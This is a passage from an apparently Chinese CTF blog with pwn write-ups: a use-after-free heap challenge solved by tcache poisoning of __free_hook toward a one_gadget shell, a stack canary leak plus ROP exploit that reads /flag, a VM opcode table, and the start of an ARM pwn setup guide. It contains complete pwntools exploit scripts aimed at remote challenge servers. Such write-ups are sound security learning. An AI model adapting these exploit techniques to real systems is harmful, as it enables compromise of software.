uaf</span></span><br><span class="line">  used_flags[v1] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;User deleted.\n&quot;</span>, <span class="number">0xEu</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里虽然说置零了，但指令的不是free的那个指针，存在uaf</p>
<h4 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">add_user</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *user; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">      <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;User limit reached.\n&quot;</span>, <span class="number">0x14u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !used_flags[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  user = <span class="built_in">malloc</span>(<span class="number">0x20u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !user )</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Allocation failed.\n&quot;</span>, <span class="number">0x12u</span>LL);</span><br><span class="line">  *user = <span class="number">0</span>;</span><br><span class="line">  user[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Enter name (up to 24 chars): &quot;</span>, <span class="number">0x1Cu</span>LL);</span><br><span class="line">  read(<span class="number">0</span>, user + <span class="number">8</span>, <span class="number">0x18u</span>LL);</span><br><span class="line">  users[i] = user;</span><br><span class="line">  used_flags[i] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;User added.\n&quot;</span>, <span class="number">0xCu</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有溢出，且只能向bk指针处写值</p>
<h4 id="edit"><a href="#edit" class="headerlink" title="edit()"></a>edit()</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit_user</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Index: &quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Invalid index.\n&quot;</span>, <span class="number">0xFu</span>LL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;New name: &quot;</span>, <span class="number">0xAu</span>LL);</span><br><span class="line">  read(<span class="number">0</span>, (users[v1] + <span class="number">8</span>), <span class="number">0x18u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Name updated.\n&quot;</span>, <span class="number">0xEu</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样没有溢出，且只能向bk指针处写值</p>
<h3 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h3><p>漏洞只有uaf，且没有溢出</p>
<p>我们要打就要考虑如何将free_hook等链入tcachebins中</p>
<p>思路：</p>
<ul>
<li>首先要通过游戏，拿到gift()中的read地址，计算出libc_base</li>
<li>申请3个chunk，并将free掉，通过game()向chunk0的fd低字节处写值</li>
<li>写值的地址哪里填上free_hook的地址，然后就好说了</li>
</ul>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">22000</span>)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;&gt;&gt;&quot;</span></span><br><span class="line">move = <span class="string">b&quot;sdddssssssddddsssdsssssdsdddddsdddsssssdddssdsssddddsddsdddsddsssdssddsssssdsdsssssssssssssdddssssdsssssssddssdsssddddsdsssssdsdddsssssdssdsdddddssdssssdssdsdssssdssdddddddddddssddssssdddsdddssdsssdsddsdddddsdsdddddsssddsdddsdsdddddddssddssddddsdddddddsddd&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name</span>):</span><br><span class="line">    sla(menu,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Enter name (up to 24 chars):&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,name</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;New name: &quot;</span>,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">game</span>(<span class="params">pay</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Game started! (WASD to move, Q to quit)&quot;</span>,pay)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;dada&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;adad&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"><span class="comment">##1.通过游戏 get libc_base</span></span><br><span class="line">game(move)</span><br><span class="line">read = l64()</span><br><span class="line">sl(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">leak(<span class="string">&#x27;read&#x27;</span>,read)</span><br><span class="line">libc_base = read - <span class="number">0x10e1e0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;free_hook&#x27;</span>,free_hook)</span><br><span class="line">one = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">og = libc_base + one[<span class="number">1</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;og&#x27;</span>,og)</span><br><span class="line"><span class="comment">##2. 填充tcache</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">##3.覆写chunk0的fd指针的低字节，概率1/16指向目标地址</span></span><br><span class="line">mo = <span class="string">b&quot;sssssssasssaasssddssdsssddssddddddwdddddddsdddwdwdddwddddwdddwwwwwwwwwwdwwawaaaaasaaaaaaawawaaaaawaw&quot;</span></span><br><span class="line">game(mo)</span><br><span class="line">sl(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#tcache_poisoning</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;aa&#x27;</span>+p64(free_hook-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;le0n&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;le0n&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(og))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="book-manager"><a href="#book-manager" class="headerlink" title="book_manager"></a>book_manager</h2><p>推测book的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span>&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> idx;</span><br><span class="line">    <span class="type">char</span> title[<span class="number">52</span>];</span><br><span class="line">    <span class="type">uint64_t</span>  title_len;</span><br><span class="line">    <span class="type">char</span> author[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint64_t</span> author_len;</span><br><span class="line">    <span class="type">char</span> pulisher[<span class="number">40</span>];</span><br><span class="line">    <span class="type">uint64_t</span> publisher_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>静态编译的程序，用sig恢复部分符号表，是一个菜单题通过数组模拟了malloc等</p>
<p>思路：</p>
<p>仔细观察可以发现，所有与book有关的操作都是通过栈来执行的，猜测栈溢出，通过程序中文件读的特点实现load(&#x2F;flag)</p>
<ul>
<li>泄露canary，在search的2中有一个封装的read()的输入函数<code>sub_40206A</code>，在最后可以多覆盖一个字节加上<code>\n</code>，就可以通过printf()来泄露canary</li>
<li>在5中发现了从bss段上copy数据到栈上</li>
<li>填充一些垃圾数据，到canary出构造rop</li>
<li>最终可以将flag读出来</li>
</ul>
<p><img data-src="/../images/image-20250510172410176.png" alt="image-20250510172410176"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-09 16:52:42</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">23000</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x4e9b2d</span></span><br><span class="line">load = <span class="number">0x40340C</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401a42</span></span><br><span class="line">ret = <span class="number">0x0000000000401a43</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_book</span>(<span class="params">title, author, publisher</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;Title&#x27;</span>, title)</span><br><span class="line">    sa(<span class="string">b&#x27;Author&#x27;</span>, author)</span><br><span class="line">    sa(<span class="string">b&#x27;Publisher&#x27;</span>, publisher)</span><br><span class="line">    log.debug(<span class="string">f&quot;已添加书籍: <span class="subst">&#123;title[:<span class="number">10</span>]&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>) </span><br><span class="line">sla(<span class="string">b&#x27;choose&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)  </span><br><span class="line">sla(<span class="string">b&#x27;name&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)  </span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + <span class="string">b&#x27;\n&#x27;</span>)  </span><br><span class="line">canary_data = p.recv(<span class="number">7</span>)</span><br><span class="line">canary = u64(canary_data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">8</span></span><br><span class="line">leak(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(pop_rdi_ret) + p64(flag_addr) + p64(load)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add_book(<span class="string">b&#x27;a&#x27;</span> * <span class="number">50</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">30</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span>)</span><br><span class="line">add_book(<span class="string">b&#x27;a&#x27;</span> * <span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">3</span>)</span><br><span class="line">add_book(payload, <span class="string">b&#x27;b&#x27;</span> * <span class="number">20</span> + <span class="string">b&#x27;\x00/flag\x00\x00\x00\x00&#x27;</span>, <span class="string">b&#x27;c&#x27;</span> * <span class="number">40</span>)</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)  </span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="mini-pwn"><a href="#mini-pwn" class="headerlink" title="mini_pwn"></a>mini_pwn</h2><p>以下是整理后的虚拟机指令集表格：</p>
<hr>
<h3 id="虚拟机指令集表格"><a href="#虚拟机指令集表格" class="headerlink" title="虚拟机指令集表格"></a><strong>虚拟机指令集表格</strong></h3><table>
<thead>
<tr>
<th align="center"><strong>指令名称</strong></th>
<th align="center"><strong>操作码</strong></th>
<th align="center"><strong>子操作码</strong></th>
<th align="center"><strong>目标寄存器</strong></th>
<th align="center"><strong>行为描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>mov reg,[mem]</strong></td>
<td align="center"><code>0x01</code></td>
<td align="center"><code>0x00</code></td>
<td align="center">A</td>
<td align="center">从内存地址<code>[SP]</code>读取8字节到寄存器A，SP +&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x01</code></td>
<td align="center">B</td>
<td align="center">从内存地址<code>[SP]</code>读取8字节到寄存器B，SP +&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x02</code></td>
<td align="center">C</td>
<td align="center">从内存地址<code>[SP]</code>读取8字节到寄存器C，SP +&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x03</code></td>
<td align="center">D</td>
<td align="center">从内存地址<code>[SP]</code>读取8字节到寄存器D，SP +&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x04</code></td>
<td align="center">E</td>
<td align="center">从内存地址<code>[SP]</code>读取8字节到寄存器E，SP +&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x05</code></td>
<td align="center">F</td>
<td align="center">从内存地址<code>[SP]</code>读取8字节到寄存器F，SP +&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x06</code></td>
<td align="center">SP</td>
<td align="center">从内存地址<code>[SP]</code>读取8字节到SP寄存器，SP +&#x3D; 8</td>
</tr>
<tr>
<td align="center"><strong>mov [mem], reg</strong></td>
<td align="center"><code>0x02</code></td>
<td align="center"><code>0x00</code></td>
<td align="center">A</td>
<td align="center">将寄存器A的值写入内存地址<code>[SP-8]</code>，SP -&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x01</code></td>
<td align="center">B</td>
<td align="center">将寄存器B的值写入内存地址<code>[SP-8]</code>，SP -&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x02</code></td>
<td align="center">C</td>
<td align="center">将寄存器C的值写入内存地址<code>[SP-8]</code>，SP -&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x03</code></td>
<td align="center">D</td>
<td align="center">将寄存器D的值写入内存地址<code>[SP-8]</code>，SP -&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x04</code></td>
<td align="center">E</td>
<td align="center">将寄存器E的值写入内存地址<code>[SP-8]</code>，SP -&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x05</code></td>
<td align="center">F</td>
<td align="center">将寄存器F的值写入内存地址<code>[SP-8]</code>，SP -&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x06</code></td>
<td align="center">SP</td>
<td align="center">将SP寄存器的值写入内存地址<code>[SP-8]</code>，SP -&#x3D; 8</td>
</tr>
<tr>
<td align="center"><strong>swapctx</strong></td>
<td align="center"><code>0x03</code></td>
<td align="center">无</td>
<td align="center">无</td>
<td align="center">保存当前寄存器状态到内存块，并恢复另一上下文（协程&#x2F;异常处理）</td>
</tr>
<tr>
<td align="center"><strong>restorectx</strong></td>
<td align="center"><code>0x04</code></td>
<td align="center">无</td>
<td align="center">无</td>
<td align="center">从内存中恢复之前保存的寄存器状态（与<code>swapctx</code>配对使用）</td>
</tr>
<tr>
<td align="center"><strong>syscall</strong></td>
<td align="center"><code>0x05</code></td>
<td align="center">无</td>
<td align="center">无</td>
<td align="center">执行Linux <code>syscall</code>，参数通过寄存器传递（A&#x3D;系统调用号，B&#x2F;C&#x2F;D&#x3D;参数）</td>
</tr>
<tr>
<td align="center"><strong>xor reg, reg</strong></td>
<td align="center"><code>0x06</code></td>
<td align="center"><code>0x00</code></td>
<td align="center">A</td>
<td align="center">将寄存器A置零</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x01</code></td>
<td align="center">B</td>
<td align="center">将寄存器B置零</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x02</code></td>
<td align="center">C</td>
<td align="center">将寄存器C置零</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x03</code></td>
<td align="center">D</td>
<td align="center">将寄存器D置零</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x04</code></td>
<td align="center">E</td>
<td align="center">将寄存器E置零</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x05</code></td>
<td align="center">F</td>
<td align="center">将寄存器F置零</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x06</code></td>
<td align="center">SP</td>
<td align="center">将SP寄存器置零</td>
</tr>
<tr>
<td align="center"><strong>add reg, 8</strong></td>
<td align="center"><code>0x07</code></td>
<td align="center"><code>0x00</code></td>
<td align="center">A</td>
<td align="center">寄存器A的值增加8（<code>A += 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x01</code></td>
<td align="center">B</td>
<td align="center">寄存器B的值增加8（<code>B += 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x02</code></td>
<td align="center">C</td>
<td align="center">寄存器C的值增加8（<code>C += 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x03</code></td>
<td align="center">D</td>
<td align="center">寄存器D的值增加8（<code>D += 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x04</code></td>
<td align="center">E</td>
<td align="center">寄存器E的值增加8（<code>E += 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x05</code></td>
<td align="center">F</td>
<td align="center">寄存器F的值增加8（<code>F += 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x06</code></td>
<td align="center">SP</td>
<td align="center">SP寄存器的值增加8（<code>SP += 8</code>）</td>
</tr>
<tr>
<td align="center"><strong>sub reg, 8</strong></td>
<td align="center"><code>0x08</code></td>
<td align="center"><code>0x00</code></td>
<td align="center">A</td>
<td align="center">寄存器A的值减少8（<code>A -= 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x01</code></td>
<td align="center">B</td>
<td align="center">寄存器B的值减少8（<code>B -= 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x02</code></td>
<td align="center">C</td>
<td align="center">寄存器C的值减少8（<code>C -= 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x03</code></td>
<td align="center">D</td>
<td align="center">寄存器D的值减少8（<code>D -= 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x04</code></td>
<td align="center">E</td>
<td align="center">寄存器E的值减少8（<code>E -= 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x05</code></td>
<td align="center">F</td>
<td align="center">寄存器F的值减少8（<code>F -= 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x06</code></td>
<td align="center">SP</td>
<td align="center">SP寄存器的值减少8（<code>SP -= 8</code>）</td>
</tr>
</tbody></table>
<h3 id="关键寄存器说明"><a href="#关键寄存器说明" class="headerlink" title="关键寄存器说明"></a><strong>关键寄存器说明</strong></h3><p>虚拟寄存器组</p>
<ul>
<li><code>A</code>: <code>xmmword_4080</code></li>
<li><code>B</code>: <code>xmmword_4080</code>的高8字节</li>
<li><code>C</code>: <code>xmmword_4090</code></li>
<li><code>D</code>: <code>xmmword_4090</code>的高8字节</li>
<li><code>E</code>: <code>xmmword_40A0</code></li>
<li><code>F</code>: <code>xmmword_40B0</code>的高8字节</li>
</ul>
<p>栈指针</p>
<ul>
<li><code>SP</code>: <code>xmmword_40B0</code>，操作内存时自动增减。</li>
</ul>
<p>状态标志</p>
<ul>
<li><code>qword_40C0</code>：用于控制上下文切换和系统调用的条件。</li>
</ul>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>arm基础+pwn</title>
    <url>/2025/07/08/arm%E6%B1%87%E7%BC%96/</url>
    <content><![CDATA[<h1 id="arm-pwn环境搭建运行"><a href="#arm-pwn环境搭建运行" class="headerlink" title="arm_pwn环境搭建运行"></a>arm_pwn环境搭建运行</h1><p><a href="https://nuoye-blog.github.io/2020/07/24/22a5ca48/">环境搭建参考链接</a></p>
<p>搭建好后找一个arm_pwn文件</p>
<p><strong>checksec可正常检测pwn文件关于arm架构</strong></p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">$ checksec pwnme                                                                           </span><br><span class="line">[*] <span class="string">&#x27;/arm_pwn/pwnme&#x27;</span></span><br><span class="line">    Arch:       arm-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x10000)</span><br></pre></td></tr></table></figure>

<p><strong>qemu（ai解释）：</strong></p>
<ol>
<li><strong>为了能运行 (Execution):</strong> 没有 QEMU 这个“翻译官”，你的 x86 电脑根本无法执行 ARM 指令，程序连第一行代码都跑不起来。</li>
<li><strong>为了方便 (Convenience):</strong> 你不需要为了 pwn 一个 ARM 程序就去买一台树莓派或者其他 ARM 开发板。你可以在你最熟悉的 x86&#x2F;Linux 环境下完成所有的分析和利用开发工作。</li>
